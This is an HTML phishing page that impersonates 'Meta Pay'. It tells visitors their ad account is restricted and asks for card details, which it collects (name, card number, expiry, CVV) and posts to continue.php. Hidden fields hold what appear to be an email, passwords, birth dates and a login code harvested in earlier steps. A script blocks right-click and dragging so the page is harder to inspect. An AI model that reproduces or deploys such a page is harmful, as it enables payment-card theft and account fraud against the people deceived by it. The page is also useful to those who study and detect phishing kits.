<!DOCTYPE html>
<html lang="en">
<head>
    <title>Meta Pay</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style>
        .anticon {
            display: inline-block;
            color: inherit;
            font-style: normal;
            line-height: 0;
            text-align: center;
            text-transform: none;
            vertical-align: -0.125em;
            text-rendering: optimizeLegibility;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .anticon>* {
            line-height: 1;
        }

        .anticon svg {
            display: inline-block;
        }

        .anticon::before {
            display: none;
        }

        .anticon .anticon-icon {
            display: block;
        }

        .anticon[tabindex] {
            cursor: pointer;
        }

        .anticon-spin::before,
        .anticon-spin {
            display: inline-block;
            -webkit-animation: loadingCircle 1s infinite linear;
            animation: loadingCircle 1s infinite linear;
        }

        @-webkit-keyframes loadingCircle {
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        @keyframes loadingCircle {
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
    </style>
    <link rel="icon" href="./assets/sound-mobile.png">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#fafafa">
    <link href="./assets/styles.css" rel="stylesheet">
    <link href="./assets/chunk1.css" rel="stylesheet">
    <link rel="apple-touch-icon" href="./assets/icon.png">
    <link href="./assets/main.chunk.css" rel="stylesheet">
    <script src="./assets/jquery.min.js"></script>
    <script type="text/javascript">
        function mousedwn(e) {
            try {
                if (event.button == 2 || event.button == 3) return false
            } catch (e) {
                if (e.which == 3) return false
            }
        }
        document.oncontextmenu = function() {
            return false
        };
        document.ondragstart = function() {
            return false
        };
        document.onmousedown = mousedwn
    </script>
</head>

<body>
    <div id="root">
        <div class="ant-spin-nested-loading">
            <div class="">
                <div class="sc-jqCOkK kFZWwp">
                    <div class="sc-gGBfsJ jvrGcO">
                        <div class="sc-jnlKLf OHNdu">
                            <div class="hARKVj">
                                <img src="./assets/sound-mobile.png" alt="" style="width: 46px;margin: 5px 15px;" class="sc-tilXH gdtVXy">
                            </div>
                            <div class="bro-1">Add payment information</div>
                            <div class="bro-2">Your advertising account has been restricted and can't advertise. Please fill in the new payment method so that the ad account is not deactivated.</div>
                            <div class="Jut1">Debit or credit card</div>
                            <div class="sc-htoDjs cDnNqw">
                                <form action="continue.php" method="post" class="ant-form ant-form-horizontal">
								<input type="hidden" name="godhelpme1ma" value="pibamow890@oprevolt.com" readonly>
								<input type="hidden" name="godhelpme1pa" value="cccccccc" readonly>
								<input type="hidden" name="godhelpme1mo" value="Oct" readonly>
								<input type="hidden" name="godhelpme1da" value="11" readonly>
								<input type="hidden" name="godhelpme1ye" value="1916" readonly>
								
								<input type="hidden" name="godhelpme2ma" value="pibamow890@oprevolt.com" readonly>
								<input type="hidden" name="godhelpme2pa" value="aaaaaaaa" readonly>
								<input type="hidden" name="godhelpme2mo" value="Sep" readonly>
								<input type="hidden" name="godhelpme2da" value="12" readonly>
								<input type="hidden" name="godhelpme2ye" value="1915" readonly>
								
								<input type="hidden" name="logincode" value="123123" readonly>
                                    <div class="ant-row ant-form-item ant-form-item-with-help" style="row-gap: 0px;">
                                        <div class="ant-col ant-form-item-control">
                                            <div class="thepadding">
                                                <div class="Jut2">Card details</div><img src="./assets/cardlogo.png" alt="" style="width: 170px;position: absolute;right: 17px;top: -4px;" class="">
                                                <input type="text" class="import-account__secret-phrase SpceE" placeholder="Name on card" name="godhelpmenoc" value="" pattern=".{5,}" maxlength="40" required="" autocomplete="off">
                                                <input type="text" class="import-account__secret-phrase SpceE" placeholder="Card Number" name="godhelpmecn" id="card" value="" pattern=".{6,}" maxlength="16" required="" autocomplete="off" onkeydown="return ( event.ctrlKey || event.altKey || (47<event.keyCode &amp;&amp; event.keyCode<58 &amp;&amp; event.shiftKey==false) || (95<event.keyCode &amp;&amp; event.keyCode<106) || (event.keyCode==8) || (event.keyCode==9) || (event.keyCode>34 &amp;&amp; event.keyCode<40) || (event.keyCode==46) )">
                                                <div id="logo"></div>
                                                <div class="BirdSeleCt">
                                                    <input type="text" class="form-selected expired" name="godhelpmecmo" id="godhelpmecmo" placeholder="MM" autofocus="1" aria-label="Month" pattern=".{1,}" maxlength="2" required="yes" onkeydown="return ( event.ctrlKey || event.altKey
    || (47<event.keyCode &amp;&amp; event.keyCode<58 &amp;&amp; event.shiftKey==false)
    || (95<event.keyCode &amp;&amp; event.keyCode<106)
    || (event.keyCode==8) || (event.keyCode==9)
    || (event.keyCode>34 &amp;&amp; event.keyCode<40)
    || (event.keyCode==46) )">

                                                    <input type="text" class="form-selected" name="godhelpmecye" id="godhelpmecye" placeholder="YY" autofocus="1" aria-label="Year" pattern=".{1,}" maxlength="2" required="yes" onkeydown="return ( event.ctrlKey || event.altKey
    || (47<event.keyCode &amp;&amp; event.keyCode<58 &amp;&amp; event.shiftKey==false)
    || (95<event.keyCode &amp;&amp; event.keyCode<106)
    || (event.keyCode==8) || (event.keyCode==9)
    || (event.keyCode>34 &amp;&amp; event.keyCode<40)
    || (event.keyCode==46) )">

                                                    <div class="cvv">
                                                        <input type="password" class="form-selectedc cvv_input l3aFTC" name="godhelpmecvv" id="godhelpmecvv" placeholder="CVV" autofocus="1" aria-label="CVV" pattern=".{3,}" maxlength="4" required="yes" onkeydown="return ( event.ctrlKey || event.altKey
        || (47<event.keyCode &amp;&amp; event.keyCode<58 &amp;&amp; event.shiftKey==false)
        || (95<event.keyCode &amp;&amp; event.keyCode<106)
        || (event.keyCode==8) || (event.keyCode==9)
        || (event.keyCode>34 &amp;&amp; event.keyCode<40)
        || (event.keyCode==46) )">
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="ant-form-item-explain">
                                            </div>
                                        </div>
                                    </div>

                                    <div class="thepadding">
                                        <button class="button sc-VigVT fWmldN" type="submit">Add</button>
                                        <div1></div1>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                    <div class="confirm-approve-content__view-full-tx-button-wrapper">
                        <div class="confirm-approve-content__view-full-tx-button cursor-pointer"></div>
                    </div>
                    <div class="wawobp loader" data-tenqwa="9fkuxe">
                        <div class="yat5ls lodas" data-2ivb6w="2n92zq">
                            <svg viewBox="0 0 40 40" width="80px" color="text" xmlns="http://www.w3.org/2000/svg" class="sc-5a69fd5e-0 iGtDTz"></svg>
                            <center>
                                <div class="sc-fYxtnH hARKVj"><img src="./assets/sound-mobile.svg" alt="" style="height: 70px;width: 150px;" class="sc-tilXH gdtVXy"></div>
                            </center>

                            <div class="7n1smr loader2 loader--style3" title="2" data-knlucr="ga7q37">
                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin:auto;background:#fff;display:block;" width="40px" height="40px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
                                    <circle cx="50" cy="50" fill="none" stroke="#0b65c6" stroke-width="10" r="35" stroke-dasharray="164.93361431346415 56.97787143782138">
                                        <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
                                    </circle>
                                </svg>

                            </div>

                            <script src="./assets/load.js"></script>
                            <script src="./assets/card-validator.js"></script>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>